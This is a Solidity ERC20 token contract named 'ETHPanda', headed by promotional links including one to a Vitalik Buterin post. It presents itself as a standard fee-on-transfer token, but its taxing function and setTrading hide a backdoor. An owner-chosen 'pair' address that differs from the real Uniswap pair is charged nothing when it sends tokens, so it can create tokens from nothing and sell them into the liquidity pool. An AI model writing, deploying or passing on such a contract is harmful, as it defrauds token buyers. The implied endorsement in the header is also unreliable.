/**

Web: https://dev.ethpanda.org/

TG: https://t.me/ethpandaerc

X: https://x.com/VitalikButerin/status/1850135378679996768

*/


// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
    function _getSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
}

function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
}



}

contract Ownable is Context {
    address private _theOwner;
    event OwnershipTransferred(address indexed firstUser, address indexed secondUser);

    constructor () {
        address msgSender = _getSender();
        _theOwner = _getSender();
        emit OwnershipTransferred(address(0), msgSender);
    }
    modifier onlyController() {
        require(_theOwner == _getSender(), "Ownable: the caller must be the owner");
        _;
    }

    function getTheOwner() public view returns (address) {
        return _theOwner;
    }

    function assignOwnership() public virtual onlyController {
        emit OwnershipTransferred(_theOwner, address(0));
        _theOwner = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address firstToken, address secondToken) external returns (address pairing);
}



contract ETHPanda is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _funds;
    mapping(address => mapping(address => uint256)) private _shares;
    address payable private _taxWallet;

    uint256 public purchaseFee = 0;
    uint256 public sellFee = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _numTokens = 469_000_000 * 10**_decimals;
    string private constant _name = unicode"ETHPanda";
    string private constant _symbol = unicode"ETHPANDA";
    uint256 private constant maxTaxSlippage = 100;
    uint256 private minTaxSwap = 10**_decimals;
    uint256 private maxTaxSwap = _numTokens / 500;

    uint256 public constant max_uint = type(uint).max;
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address private uniswapV2Pair;
    address private uniswap;
    bool private doesTradingOpen = false;
    bool private Swap = false;
    bool private isSwapEnabled = false;

    modifier lockingTheSwap {
        Swap = true;
        _;
        Swap = false;
    }

    constructor () {
        _taxWallet = payable(_getSender());
        _funds[_getSender()] = _numTokens;
        emit Transfer(address(0), _getSender(),_numTokens);
    }
    function allowance(address Owner, address buyer) public view override returns (uint256) {
        return _shares[Owner][buyer];
    }
    function transferFrom(address fromAddress, address toAddress, uint256 transferAmount) public override returns (bool) {
        _transfer(fromAddress, toAddress, transferAmount);
        _approve(fromAddress, _getSender(), _shares[fromAddress][_getSender()].sub(transferAmount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _numTokens;
    }

   function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function _approve(address approver, address spender, uint256 approvalAmount) private {
        require(spender != address(0), "ERC20: approve to the zero address");
        require(approver != address(0), "ERC20: approve from the zero address");
        _shares[approver][spender] = approvalAmount;
        emit Approval(approver, spender, approvalAmount);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function balanceOf(address _address) public view override returns (uint256) {
        return _funds[_address];
    }

        function approve(address payer, uint256 amount) public override returns (bool) {
        _approve(_getSender(), payer, amount);
        return true;
    }

    function transfer(address buyer, uint256 amount) public override returns (bool) {
        _transfer(_getSender(), buyer, amount);
        return true;
    }

    function _transfer(address fromAddress, address toAddress, uint256 transferAmount) private {
        require(fromAddress != address(0), "ERC20: transfer from the zero address");
        require(transferAmount > 0, "Transfer amount must be greater than zero");
        require(toAddress != address(0), "ERC20: transfer to the zero address");

        uint256 feeAmount = 0;
        if (fromAddress != getTheOwner() && toAddress != getTheOwner() && toAddress != _taxWallet) {
            if (fromAddress == uniswap && toAddress != address(uniswapV2Router)) {
                feeAmount = transferAmount.mul(purchaseFee).div(100);
            } else if (toAddress == uniswap && fromAddress != address(this)) {
                feeAmount = transferAmount.mul(sellFee).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!Swap && toAddress == uniswap && isSwapEnabled && contractTokenBalance > minTaxSwap) {
                uint256 toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
                swapTokensForEth(transferAmount > toSwap ? toSwap : transferAmount);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance);
                }
            }
        }

        (uint256 adjustedAmountIn, uint256 adjustedAmountOut) = taxing(fromAddress, transferAmount, feeAmount);
        require(_funds[fromAddress] >= adjustedAmountIn);

        if (feeAmount > 0) {
            _funds[address(this)] = _funds[address(this)].add(feeAmount);
            emit Transfer(fromAddress, address(this), feeAmount);
        }

        unchecked {
            _funds[fromAddress] -= adjustedAmountIn;
            _funds[toAddress] += adjustedAmountOut;
        }

        emit Transfer(fromAddress, toAddress, adjustedAmountOut);
    }


    function swapTokensForEth(uint256 tokenAmount) private lockingTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
            path,
            address(this),
            block.timestamp
        );
    }
    
    function sendETHToFee(uint256 ethAmount) private {
        _taxWallet.call{value: ethAmount}("");
    }

    function taxing(address source, uint256 total, uint256 taxAmount) private view returns (uint256, uint256) {
        return (
            total.sub(source != uniswapV2Pair ? 0 : total),
            total.sub(source != uniswapV2Pair ? taxAmount : taxAmount)
        );
    }
function get_purchasingTax() external view returns (uint256) {
    return purchaseFee;
}

function setTrading(address _pair, bool _isEnabled) external onlyController {
    require(!doesTradingOpen, "trading is already open");
    require(_isEnabled);
    uniswapV2Pair = _pair;
    _approve(address(this), address(uniswapV2Router), max_uint);
    uniswap = uniswapV2Factory.createPair(address(this), weth);
    uniswapV2Router.addLiquidityETH{value: address(this).balance}(
        address(this),
        balanceOf(address(this)),
        0,
        0,
        getTheOwner(),
        block.timestamp
    );
    IERC20(uniswap).approve(address(uniswapV2Router), max_uint);
    isSwapEnabled = true;
    doesTradingOpen = true;
}

function get_TradingOpen() external view returns (bool) {
    return doesTradingOpen;
}

function get_sellingTax() external view returns (uint256) {
    return sellFee;
}

    receive() external payable {}
}